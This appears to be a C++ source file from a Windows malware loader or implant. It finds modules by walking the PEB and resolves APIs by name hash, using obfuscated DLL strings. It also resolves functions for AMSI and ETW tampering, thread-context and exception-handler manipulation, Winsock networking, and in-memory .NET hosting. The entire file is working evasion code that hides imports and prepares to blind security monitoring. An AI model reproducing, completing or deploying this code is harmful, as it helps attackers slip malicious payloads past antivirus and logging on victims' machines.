#include "peb_walk.h"
#include "hash.h"
#include "obfstr.h"
#include <cstdio>
#include <intrin.h>

ResolvedAPIs g_apis = {};

static uint32_t djb2_hash_wide_ci(const wchar_t* str) {
    uint32_t hash = 5381;
    while (*str) {
        wchar_t c = *str;
        if (c >= L'A' && c <= L'Z') c += 32;
        hash = ((hash << 5) + hash) + static_cast<unsigned char>(c & 0xFF);
        str++;
    }
    return hash;
}

void* get_module_base(uint32_t dll_hash) {
#if defined(_M_X64)
    PEB* peb = reinterpret_cast<PEB*>(__readgsqword(0x60));
#else
    PEB* peb = reinterpret_cast<PEB*>(__readfsdword(0x30));
#endif

    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY* mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (mod->FullDllName.Buffer != nullptr && mod->FullDllName.Length > 0) {
            const wchar_t* full = mod->FullDllName.Buffer;
            const wchar_t* name = full;
            for (const wchar_t* p = full; *p; p++) {
                if (*p == L'\\' || *p == L'/') name = p + 1;
            }

            uint32_t h = djb2_hash_wide_ci(name);
            if (h == dll_hash) {
                return mod->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return nullptr;
}

void* resolve_function(uint32_t dll_hash, uint32_t func_hash) {
    uint8_t* base = reinterpret_cast<uint8_t*>(get_module_base(dll_hash));
    if (!base) return nullptr;

    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    IMAGE_DATA_DIRECTORY& exportDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) return nullptr;

    IMAGE_EXPORT_DIRECTORY* exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(base + exportDir.VirtualAddress);
    uint32_t* names = reinterpret_cast<uint32_t*>(base + exports->AddressOfNames);
    uint16_t* ordinals = reinterpret_cast<uint16_t*>(base + exports->AddressOfNameOrdinals);
    uint32_t* functions = reinterpret_cast<uint32_t*>(base + exports->AddressOfFunctions);

    for (uint32_t i = 0; i < exports->NumberOfNames; i++) {
        const char* funcName = reinterpret_cast<const char*>(base + names[i]);
        uint32_t h = djb2_hash(funcName);
        if (h == func_hash) {
            uint32_t funcRVA = functions[ordinals[i]];
            if (funcRVA >= exportDir.VirtualAddress &&
                funcRVA < exportDir.VirtualAddress + exportDir.Size) {
                return nullptr;
            }
            return base + funcRVA;
        }
    }
    return nullptr;
}

bool load_dll_obf(const wchar_t* dll_path, HANDLE* out_handle) {
    if (!g_apis.pLdrLoadDll || !g_apis.pRtlInitUnicodeString) return false;

    UNICODE_STRING usDll;
    g_apis.pRtlInitUnicodeString(&usDll, dll_path);

    HANDLE hModule = nullptr;
    NTSTATUS status = g_apis.pLdrLoadDll(nullptr, 0, &usDll, &hModule);
    if (status != 0 || hModule == nullptr) return false;

    if (out_handle) *out_handle = hModule;
    return true;
}

bool resolve_phase1_ntdll() {
    g_apis.pLdrLoadDll = reinterpret_cast<fn_LdrLoadDll>(
        resolve_function(HASH_NTDLL, HASH_LdrLoadDll));
    if (!g_apis.pLdrLoadDll) return false;

    g_apis.pRtlInitUnicodeString = reinterpret_cast<fn_RtlInitUnicodeString>(
        resolve_function(HASH_NTDLL, HASH_RtlInitUnicodeString));
    if (!g_apis.pRtlInitUnicodeString) return false;

    g_apis.pEtwEventWrite = reinterpret_cast<fn_EtwEventWrite>(
        resolve_function(HASH_NTDLL, HASH_EtwEventWrite));
    if (!g_apis.pEtwEventWrite) return false;

    g_apis.pTpAllocWork = reinterpret_cast<fn_TpAllocWork>(
        resolve_function(HASH_NTDLL, HASH_TpAllocWork));
    g_apis.pTpPostWork = reinterpret_cast<fn_TpPostWork>(
        resolve_function(HASH_NTDLL, HASH_TpPostWork));
    g_apis.pTpReleaseWork = reinterpret_cast<fn_TpReleaseWork>(
        resolve_function(HASH_NTDLL, HASH_TpReleaseWork));

    if (!g_apis.pTpAllocWork || !g_apis.pTpPostWork || !g_apis.pTpReleaseWork)
        return false;

    return true;
}

bool resolve_phase2_kernel32() {
    g_apis.pGetThreadContext = reinterpret_cast<fn_GetThreadContext>(
        resolve_function(HASH_KERNEL32, HASH_GetThreadContext));
    g_apis.pSetThreadContext = reinterpret_cast<fn_SetThreadContext>(
        resolve_function(HASH_KERNEL32, HASH_SetThreadContext));
    g_apis.pGetCurrentThread = reinterpret_cast<fn_GetCurrentThread>(
        resolve_function(HASH_KERNEL32, HASH_GetCurrentThread));
    g_apis.pAddVectoredExceptionHandler = reinterpret_cast<fn_AddVectoredExceptionHandler>(
        resolve_function(HASH_KERNEL32, HASH_AddVectoredExceptionHandler));
    g_apis.pRemoveVectoredExceptionHandler = reinterpret_cast<fn_RemoveVectoredExceptionHandler>(
        resolve_function(HASH_KERNEL32, HASH_RemoveVectoredExceptionHandler));
    g_apis.pGetCurrentProcess = reinterpret_cast<fn_GetCurrentProcess>(
        resolve_function(HASH_KERNEL32, HASH_GetCurrentProcess));

    if (!g_apis.pGetThreadContext) {
        g_apis.pGetThreadContext = reinterpret_cast<fn_GetThreadContext>(
            resolve_function(HASH_KERNELBASE, HASH_GetThreadContext));
    }
    if (!g_apis.pSetThreadContext) {
        g_apis.pSetThreadContext = reinterpret_cast<fn_SetThreadContext>(
            resolve_function(HASH_KERNELBASE, HASH_SetThreadContext));
    }
    if (!g_apis.pAddVectoredExceptionHandler) {
        g_apis.pAddVectoredExceptionHandler = reinterpret_cast<fn_AddVectoredExceptionHandler>(
            resolve_function(HASH_KERNELBASE, HASH_AddVectoredExceptionHandler));
    }
    if (!g_apis.pRemoveVectoredExceptionHandler) {
        g_apis.pRemoveVectoredExceptionHandler = reinterpret_cast<fn_RemoveVectoredExceptionHandler>(
            resolve_function(HASH_KERNELBASE, HASH_RemoveVectoredExceptionHandler));
    }
    if (!g_apis.pGetCurrentThread) {
        g_apis.pGetCurrentThread = reinterpret_cast<fn_GetCurrentThread>(
            resolve_function(HASH_KERNELBASE, HASH_GetCurrentThread));
    }
    if (!g_apis.pGetCurrentProcess) {
        g_apis.pGetCurrentProcess = reinterpret_cast<fn_GetCurrentProcess>(
            resolve_function(HASH_KERNELBASE, HASH_GetCurrentProcess));
    }
    if (!g_apis.pAddVectoredExceptionHandler) {
        g_apis.pAddVectoredExceptionHandler = reinterpret_cast<fn_AddVectoredExceptionHandler>(
            resolve_function(HASH_NTDLL, djb2_hash("RtlAddVectoredExceptionHandler")));
    }
    if (!g_apis.pRemoveVectoredExceptionHandler) {
        g_apis.pRemoveVectoredExceptionHandler = reinterpret_cast<fn_RemoveVectoredExceptionHandler>(
            resolve_function(HASH_NTDLL, djb2_hash("RtlRemoveVectoredExceptionHandler")));
    }

    if (!g_apis.pGetThreadContext || !g_apis.pSetThreadContext ||
        !g_apis.pGetCurrentThread || !g_apis.pAddVectoredExceptionHandler ||
        !g_apis.pRemoveVectoredExceptionHandler || !g_apis.pGetCurrentProcess) {
        return false;
    }

    return true;
}

bool resolve_phase3_winsock() {
    auto path = OBFWSTR(L"ws2_32.dll");
    HANDLE hWs2 = nullptr;
    if (!load_dll_obf(path.c_str(), &hWs2)) return false;

    g_apis.pWSAStartup = reinterpret_cast<fn_WSAStartup>(
        resolve_function(HASH_WS2_32, HASH_WSAStartup));
    g_apis.pSocket = reinterpret_cast<fn_socket>(
        resolve_function(HASH_WS2_32, HASH_socket));
    g_apis.pConnect = reinterpret_cast<fn_connect>(
        resolve_function(HASH_WS2_32, HASH_connect));
    g_apis.pSend = reinterpret_cast<fn_send>(
        resolve_function(HASH_WS2_32, HASH_send));
    g_apis.pRecv = reinterpret_cast<fn_recv>(
        resolve_function(HASH_WS2_32, HASH_recv));
    g_apis.pSelect = reinterpret_cast<fn_select>(
        resolve_function(HASH_WS2_32, HASH_select));
    g_apis.pClosesocket = reinterpret_cast<fn_closesocket>(
        resolve_function(HASH_WS2_32, HASH_closesocket));
    g_apis.pWSACleanup = reinterpret_cast<fn_WSACleanup>(
        resolve_function(HASH_WS2_32, HASH_WSACleanup));
    g_apis.pGetaddrinfo = reinterpret_cast<fn_getaddrinfo>(
        resolve_function(HASH_WS2_32, HASH_getaddrinfo));
    g_apis.pFreeaddrinfo = reinterpret_cast<fn_freeaddrinfo>(
        resolve_function(HASH_WS2_32, HASH_freeaddrinfo));

    if (!g_apis.pWSAStartup || !g_apis.pSocket || !g_apis.pConnect ||
        !g_apis.pSend || !g_apis.pRecv || !g_apis.pSelect ||
        !g_apis.pClosesocket || !g_apis.pWSACleanup ||
        !g_apis.pGetaddrinfo || !g_apis.pFreeaddrinfo) {
        return false;
    }

    return true;
}

bool resolve_phase4_mscoree() {
    auto path = OBFWSTR(L"mscoree.dll");
    HANDLE hMscoree = nullptr;
    if (!load_dll_obf(path.c_str(), &hMscoree)) return false;

    g_apis.pCLRCreateInstance = reinterpret_cast<fn_CLRCreateInstance>(
        resolve_function(HASH_MSCOREE, HASH_CLRCreateInstance));
    if (!g_apis.pCLRCreateInstance) return false;

    return true;
}

bool resolve_phase5_amsi() {
    auto path = OBFWSTR(L"amsi.dll");
    HANDLE hAmsi = nullptr;
    if (!load_dll_obf(path.c_str(), &hAmsi)) return false;

    g_apis.pAmsiScanBuffer = reinterpret_cast<fn_AmsiScanBuffer>(
        resolve_function(HASH_AMSI, HASH_AmsiScanBuffer));
    if (!g_apis.pAmsiScanBuffer) return false;

    return true;
}
